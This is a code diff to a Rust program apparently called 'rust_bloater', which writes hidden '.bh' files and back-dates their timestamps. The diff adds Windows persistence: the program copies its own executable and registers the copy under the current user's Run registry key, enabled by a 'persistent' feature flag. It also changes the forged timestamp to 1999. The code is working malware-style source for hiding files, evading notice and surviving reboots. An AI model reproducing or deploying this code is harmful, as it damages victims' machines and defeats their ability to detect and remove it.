@@ -1,5 +1,10 @@
 extern crate winapi;
 
+use winreg::enums::RegType::REG_BINARY;
+use winreg::enums::{HKEY_CURRENT_USER, KEY_READ, KEY_SET_VALUE};
+use winreg::{RegKey, RegValue};
+static AL_REGKEY: &str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
 use core::slice;
 use std::fs::*;
 use std::io::*;
@@ -25,10 +30,10 @@ fn slice_string(input: &str) -> &str {
 }
 
 #[cfg(target_os = "windows")]
+// Create the file when compiled on Windows system
 fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	
 
 	let path_file: String = format!("{}{}.bh",path,name);
-
 	let _ = File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file).expect("Valid filepath").write_all(&data);
 
 	return path_file
@@ -36,6 +41,7 @@ fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{
 }
 
 #[cfg(target_os = "linux")]
+// Create the file when compiled on Linux system
 fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	
 
 	let path_file: String = format!("{}.{}.bh",path,name);
@@ -48,6 +54,52 @@ fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{
 
 }
 
+
+#[cfg(target_os = "windows")]
+fn adding_persistence(filepath: &str) -> std::io::Result<()>{
+	let original_path = std::env::current_exe()?;
+    let new_path = format!("{}{}",&filepath,"bloater_copy.exe");
+
+    let mut f ;
+	let mut buffer:Vec<u8> = Vec::new();
+
+    let file = match File::open(&original_path){
+		Ok(mut file) => {
+			file.read_to_end(&mut buffer);
+			f = File::create(&new_path).unwrap();
+		},
+		Err(err) => {
+			println!("File not found");
+			std::process::exit(1);
+		}
+
+	};        
+
+	f.write_all(&buffer);
+
+    println!("Created a copy of {} at {}", original_path.display(), new_path);
+
+	let name = "rust_bloater";
+
+
+	
+	let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+        hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
+            .set_value::<_, _>(
+                &name,
+                &str::replace(&new_path, "/", r"\"),
+            )?;
+
+
+
+	Ok(())
+}
+
+
+#[cfg(target_os = "linux")]
+fn adding_persistence(path: &str) -> std::io::Result<()>{
+	Ok(())	
+}
 
 
 
@@ -117,12 +169,18 @@ fn main() -> std::io::Result<()> {
 			let path_file: String = create_file(&valid_path,n2,encoded);
 			
 			// Change the access and modified date
-			set_file_times(path_file, FileTime::from_unix_time(1611048846,0),FileTime::from_unix_time(1611048846,0));
+			set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
 
 			}
 
+			#[cfg(feature="persistent")]{
+				adding_persistence(&valid_path);
+				}
+			
+
 	}	
 
+	
 	Ok(())
 
 }
